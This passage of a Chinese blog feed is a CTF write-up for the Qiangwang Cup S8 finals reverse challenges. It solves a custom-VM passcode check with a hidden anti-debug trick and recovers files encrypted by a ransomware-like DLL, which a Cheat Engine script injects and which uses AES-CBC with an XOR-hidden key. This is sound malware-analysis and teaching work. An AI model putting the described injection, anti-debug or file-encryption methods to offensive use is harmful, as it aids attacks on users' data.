class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure><p>最前面事实上就是输出一句话 <code>Thank for providing passcode, my ultimate secret box is checking...</code> 用的，跳过之后就能看到。其中最明显的应该能看到它频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>，不难想到，这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure><p>而最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p><p>而把log拉到最后发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure><p>我们所计算的第一个异或值，在最后一刻被加起来返回了。</p><p>而外面判断我们的输入是否正确，依赖于返回值是否为 0，因此我们要尽可能让每次异或值都相等，这里用个小技巧，将要输出的值打印到 stderr 中，再用重定向 <code>2&gt;out.txt</code> 就可以快速拿到一些值。</p><p>首先我们拿异或的目标值，在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code>，得到值。</p><p>然后拿每一个字节的每一位的权值，在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code>，得到值。</p><p>最终根据逻辑，写出还原 passcode 的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> v[]=&#123;</span><br><span class="line"><span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">31</span>,<span class="number">97</span>,<span class="number">3</span>,<span class="number">41</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">71</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">7</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">89</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">73</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">79</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">79</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">79</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">61</span>,<span class="number">3</span>,<span class="number">71</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">79</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">31</span>,<span class="number">97</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">53</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">73</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">47</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">59</span>,&#125;;</span><br><span class="line"><span class="type">char</span> target[]=&#123;<span class="number">70</span>,<span class="number">56</span>,<span class="number">70</span>,<span class="number">77</span>,<span class="number">74</span>,<span class="number">90</span>,<span class="number">87</span>,<span class="number">82</span>,<span class="number">60</span>,<span class="number">67</span>,<span class="number">86</span>,<span class="number">95</span>,<span class="number">64</span>,<span class="number">94</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">33</span>,<span class="number">69</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">94</span>,<span class="number">93</span>,<span class="number">90</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">65</span>,<span class="number">93</span>,<span class="number">96</span>,&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">checkval</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> pos)</span>&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">sum+=((i&gt;&gt;j)&amp;<span class="number">1</span>)*v[j+pos*<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(target);i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0x20</span>;j&lt;<span class="number">127</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i]==checkval(j,i))&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span></span><br></pre></td></tr></table></figure><p>输入后得到 <code>flag</code>。</p><img src="/2024/12/11/qwb2024_final_reverse/3.png" class=""><p>最后注意一下，这个反调试有点隐蔽，只要中了反调试就会修改 quest 这个文件，如果你不注意文件修改日期的话那么永远也算不出正确答案了。</p><h3 id="反调试手段分析"><a href="#反调试手段分析" class="headerlink" title="反调试手段分析"></a>反调试手段分析</h3><p>如何发现反调试？通常情况下，我们不会刻意地去注意反调试，只有当程序提示，报错，运行结果附加调试器与不附加调试器运行结果有较大差异时，才会去注意反调试。</p><p>这里程序初始化的时候会拉起反调试，不过需要非常仔细，能够敏锐地观察到 vm 的代码文件被修改了。</p><img src="/2024/12/11/qwb2024_final_reverse/4.png" class=""><p>首先确定反调试的位置，在main函数下断点，检查文件是否被修改。</p><img src="/2024/12/11/qwb2024_final_reverse/5.png" class=""><p>发现main函数之前反调试就运行完了，那么就要讲到 main 函数之前调用的代码了，在 Linux 中，会保存一个 init_array，它会保存一系列的函数指针，这些函数先于 main 被调用；同样的，在 windows 中也有类似的。</p><p>通过 initterm 函数交叉引用找到 First 指针，获取函数指针的起始地址。</p><img src="/2024/12/11/qwb2024_final_reverse/6.png" class=""><p>在指向的函数中，<code>sub_140001190</code> 是反调试的关键函数</p><img src="/2024/12/11/qwb2024_final_reverse/7.png" class=""><p>其中对 FileName 变量似乎在做一个异或解密的操作，异或的key是0x69，dump下来解密之后发现果然是在对目标文件进行操作。</p><img src="/2024/12/11/qwb2024_final_reverse/8.png" class=""><p>下面一系列就是写这个文件了，不过在这之前有一个关键判断 <code>qword_14002ED10</code>，这个函数指针保存了哪个函数，大概率是 IsDebuggerPresent 了，但是还是去验证一遍。</p><p>交叉找到赋值的位置，是在这之前执行的函数内容。</p><img src="/2024/12/11/qwb2024_final_reverse/9.png" class=""><p>下断点，看看能否断在这里，发现果真如我们所料</p><img src="/2024/12/11/qwb2024_final_reverse/10.png" class=""><p>那么这个反调试的过程就是在main函数之前先执行了两个函数，一个函数获取 IsDebuggerPresent 函数的地址保存在全局变量中，第二个函数调用这个 API 判断，如果的确被调试那么修改 quest 的文件内容。</p><p>对于这个绕过直接上 xdbg 的反调试插件 or 修改文件名，队爹就是直接上 xdbg 甚至感受不到反调试的存在，而我狂踩坑…</p><h2 id="UnsafeFile"><a href="#UnsafeFile" class="headerlink" title="UnsafeFile"></a>UnsafeFile</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><a href="UnsafeFile_fc430c76e4728fdfc829eee12723cbdd.zip">附件下载</a>，解压密码 <code>2024qwbfinal</code>。</p><blockquote><p>作者在此申明：本题目为类勒索病毒分析的题目，若要分析请一定一定不要在个人电脑或者公共电脑上运行此程序，请在虚拟机中调试分析，若因此造成任何的损失与作者无关。</p></blockquote><p>以下是原题目描述</p><blockquote><p>小Y玩游戏很菜，于是他找了个神秘人要了一个修改器文件，在开启功能后，发现他的一个重要文件居然被加密了，你能想办法帮他恢复吗？</p><p>请不要在物理机上运行题目中的任何文件，主办方对由此造成的任何损失不承担任何责任，如有需要请在虚拟机内进行运行和调试，解压密码:2024qwbfinal</p></blockquote><h3 id="基本分析-1"><a href="#基本分析-1" class="headerlink" title="基本分析"></a>基本分析</h3><p>压缩包给了两个文件，一个是 CT 脚本，一个是 .pdf.yr，看起来 .yr 是一个勒索了 pdf 类型文件的后缀。</p><p>先看看 CT 脚本，运行之后会拉起 DBK 驱动，运行计算器，并且看标题似乎是一个植物大战僵尸的修改器。</p><img src="/2024/12/11/qwb2024_final_reverse/11.png" class=""><p>其中比较主要的就是运行了一个 <code>decodeFunction</code> 去解密一段函数运行，这里可以直接用<a href="https://github.com/FeeeeK/CEFunctionDecoder">网上的脚本</a>还原这段。</p><p>运行后得到一个 luac 文件，luac 文件需要用另一个工具去还原为 lua 脚本，这里我是用的是 <code>unluac_2023_12_24.jar</code>，同样附上下载地址：<a href="https://sourceforge.net/projects/unluac/files/Unstable/">https://sourceforge.net/projects/unluac/files/Unstable/</a></p><img src="/2024/12/11/qwb2024_final_reverse/12.png" class=""><p>前面都是一些赋值函数，拉到最后发现几个有意思的字符串，其中 <code>C:\\system.dll</code> 引起了注意，于是去对应目录下，能找到一个 dll 文件，那么毫无疑问，剩下的就是对 system.dll 进行分析了，lua 脚本应该就是做注入用的。</p><p>dllmain 一个很标准的起线程的动作</p><img src="/2024/12/11/qwb2024_final_reverse/13.png" class=""><p>这个 StartAddress 就比较有意思，一直执着于判断自身某个内存的标志位，循环，而循环体内就是一直在 Sleep。</p><p>中间用 FindCrypt 发现 AES 的模式。</p><img src="/2024/12/11/qwb2024_final_reverse/14.png" class=""><p>那么毫无疑问，勒索的文件应该是使用 AES 加密的，交叉找到对应的函数，其中一个是 <code>10001840</code>，另一个是 <code>10001790</code>。</p><p>静态分析比较难了，下面开始动态分析。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>因为是个 dll，还不像 exe 那样好调试，这里我写了一个简单的 demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接远线程注入这个模块，为了能断下，选择 patch dll 的 dllmain 函数开头为 <code>int 3</code></p><img src="/2024/12/11/qwb2024_final_reverse/15.png" class=""><p>然后，虚拟机里</p><p>x32 起被调试程序，用注入器注入这个 dll。</p><img src="/2024/12/11/qwb2024_final_reverse/16.png" class=""><p>程序成功被断下来</p><img src="/2024/12/11/qwb2024_final_reverse/17.png" class=""><p>这里可以去恢复 int 3 指令然后重新执行一遍。</p><p>如果不改那个标志位，发现 <code>while ( !byte_1000C6DC )</code> 将会是一个死循环，这里估计是要等某个合适的时机，因此找到这个标志位将它赋值为1。</p><img src="/2024/12/11/qwb2024_final_reverse/18.png" class=""><p>跳出循环之后，执行了一个函数</p><img src="/2024/12/11/qwb2024_final_reverse/19.png" class=""><p>看字符串，获取了用户名，又有 Documents 字符串，猜测是对我们用户目录下的文档文件感兴趣，这里可以随意写几个pdf文件让它加密看看它的规律。</p><p>往后跟进几步，发现关键字符串</p><img src="/2024/12/11/qwb2024_final_reverse/20.png" class=""><p>往后跟进之后发现，抛异常了，不过很幸运的是，栈中有数据提示我们</p><img src="/2024/12/11/qwb2024_final_reverse/21.png" class=""><p>文件大小需要时 16 的倍数，那就换一个 16 个 a 的 pdf 文件再来一次。</p><p>随后调试到调用 AES 函数之前，这里需要分析一下这个参数的作用，调用约定属于 thiscall，this 指针存 ECX，其余参数从右往左压入栈中。</p><img src="/2024/12/11/qwb2024_final_reverse/22.png" class=""><p>这里记录一下第三个参数指向的一片内存，这个内存每次运行都不一样，先记录一下。</p><p><code>C3 67 B7 93 5E 0D AB 9A 48 3D BA EB 65 5F B5 92</code></p><p>而第二个参数就是指向了一片 <code>0xBAADF00D</code> 的内存。运行放过去，同时火绒剑也查获了一下这个 dll 的行为。</p><img src="/2024/12/11/qwb2024_final_reverse/23.png" class=""><p>加密文件，删除文件，典型的勒索病毒，同时也注意到多次运行的加密结果是不一样的，而且原本16字节的结果变成了48字节，AES就算是 padding 模式也不会多 32 字节，于是断定它必然是随机加密，而密钥肯定也保存到了文件里，这里 AES 的参数很有可能就是密钥。</p><img src="/2024/12/11/qwb2024_final_reverse/24.png" class=""><p>其实原本这里有点山穷水尽了，后面的结论要得出来对我就比较看运气（高手肉眼就看出来）了。</p><p>偶然的情况下，上面的第二个参数生成了 00 字节，而对应的第二行位置上生成了 0x5A，又联想到之前 lua 脚本写过一段异或 0x5a 的脚本。</p><img src="/2024/12/11/qwb2024_final_reverse/25.png" class=""><p> 相对应地，去源码中找到这一段 <code>system.dll+25C6</code>，在此下断点调试。</p><img src="/2024/12/11/qwb2024_final_reverse/26.png" class=""><p>发现它在异或 0068D14D 的内存，异或了 0x10 个字节，难道说这就是所看到的密钥，验证一遍</p><img src="/2024/12/11/qwb2024_final_reverse/27.png" class=""><p>发现果然就是它会将真实密钥每个字节异或 0x5A 之后保存到倒数第二行，那么最后一行必然不可能是 padding，猜测应该是初始向量，这是一个 CBC 模式的 AES。</p><p>通过研究 lua 脚本还发现，它似乎还对 DLL 进行了 hook，并且使用了 WriteByte 将 <code>system.dll+C6DC</code> 写为了 1，好样的，就是前面死循环的条件 <code>while(!byte_1000C6DC)</code>，在这一刻完成了闭环。这个 dll 不仅用 lua 进行注入，还进行了一定的 hook，直接运行分析样本可能真分析不太出来，其实这里猜也能猜个大概了，但是作者这里觉得还是力求分析完整这个样本。</p><p>首先看看 initterm 函数的函数指针，发现了一些有意思的函数</p><img src="/2024/12/11/qwb2024_final_reverse/28.png" class=""><p>使用 <code>std::_Random_device</code> 获取随机数，随后使用梅森旋转算法计算后续的随机数，这里 <code>0x6C078965</code> 是该算法的一个常数，搜也是能搜出来的。</p><p>而随后将计算出的这么多随机数，使用一定的算法将某 0x10 个字节赋值到了 this 指针，一共调用了两次这个函数，一个在 <code>sub_10001000</code>，另一个在 <code>sub_10001020</code>。赋值的全局变量分别在 <code>1000C6E0</code> 和 <code>1000C6EC</code>，这个是一开始就生成好的。</p><p>自己再去调试一遍也可以验证得到 <code>1000C6E0</code> 指针所指向的值，就是被异或加密前的密钥，或者说就是 pdf 倒数第二行异或 0x5A 的结果，而最后一行的结果与 <code>1000C6EC</code> 指针所指向的内容是一致的。</p><p>因此可以验证一遍：</p><img src="/2024/12/11/qwb2024_final_reverse/29.png" class=""><p>确定没问题之后就可以开始恢复 pdf 文件了，但是因为我的 system.dll 没有做 hook，而 lua 脚本运行的时候做了 hook，因此在题目加密的 pdf 文件中，要先交换高低半个字节，再异或，才是原始密钥。</p><p>先写一下解密 key 的脚本：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[]=<span class="string">&quot;\xcd\x8b\x95\xe3\x1f\x16\xd9\x21\x6b\x3c\x3c\x24\xb2\x6e\x98\xe7&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t=key[i]&amp;<span class="number">0xf</span>;</span><br><span class="line">key[i]&gt;&gt;=<span class="number">4</span>;</span><br><span class="line">key[i]|=t&lt;&lt;<span class="number">4</span>;</span><br><span class="line">key[i]^=<span class="number">0x5A</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>,key[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿得到的结果去解密</p><img src="/2024/12/11/qwb2024_final_reverse/30.png" class=""><p>可以发现已经是一个 pdf 文件头了，下载，打开查看，flag 到手。</p><img src="/2024/12/11/qwb2024_final_reverse/31.png" class=""><hr><p>还有一道 bvp47 也是一道恶意样本分析的题，但是目前精力有限，可能要咕很久才能做出来了233。</p>]]></content>
    
    
    <summary type="html">复盘一下强网决赛的Reverse题</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8决赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/"/>
    
    <category term="Reverse" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8决赛pwn writeup</title>
    <link href="https://xia0ji233.github.io/2024/12/08/qwb2024_final/"/>
    <id>https://xia0ji233.github.io/2024/12/08/qwb2024_final/</id>
